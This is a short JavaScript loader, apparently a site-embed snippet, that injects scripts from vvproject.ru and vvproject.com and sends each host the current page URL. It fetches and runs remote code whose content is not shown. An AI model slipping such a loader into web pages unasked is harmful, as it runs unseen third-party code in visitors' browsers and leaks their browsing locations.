(function(){
    window.vv_boot=vvl=[];
    q=function(a){
        var vvs=document.createElement('script');
        vvl.push(vvs);
        vvs.type='text/javascript';
        vvs.async=true;
        vvs.src=window.location.protocol.concat('//').concat(a).concat('?view=boot&version=4&key=0d8d1b7082355bb392d4702434c6baaf&where=').concat(encodeURIComponent(location.toString()));
        vvs.setAttribute('ok','1');
        (document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(vvs);
    };
    q('vvproject.ru');
    q('vvproject.com');
})();
